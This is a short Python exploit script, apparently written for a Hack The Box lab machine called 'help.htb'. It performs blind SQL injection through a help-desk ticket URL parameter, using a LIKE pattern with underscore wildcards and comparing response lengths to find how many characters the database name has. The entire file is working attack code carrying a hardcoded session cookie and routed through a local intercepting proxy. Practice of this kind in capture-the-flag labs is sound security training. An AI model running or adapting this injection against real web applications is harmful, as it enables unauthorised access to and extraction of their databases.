import requests
import string
import warnings
#warnings.filterwarnings("ignore")


proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

headers = {'Cookie': 'lang=english; PHPSESSID=20q6sd4sfdodqrkk71u2cu7701; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BE2ybJGr2AxcgjAuRSLBd%2B5xTmGhIMHpryOPqRobEojxg%3D%3D'}



def charsDBName():

	url = "http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6+and+(select+1=1+from+dual+where+database()+like+'"

	for i in range(0,15):
		i = i+1

		part1 = url + i*"_" + "')+--+-"

		r = requests.get(part1, headers=headers, proxies=proxies, verify=False)
		t = r.content
		#print(len(t))

		if len(t) == 78881:
			print("no of chars in dbname are" , i)

charsDBName()

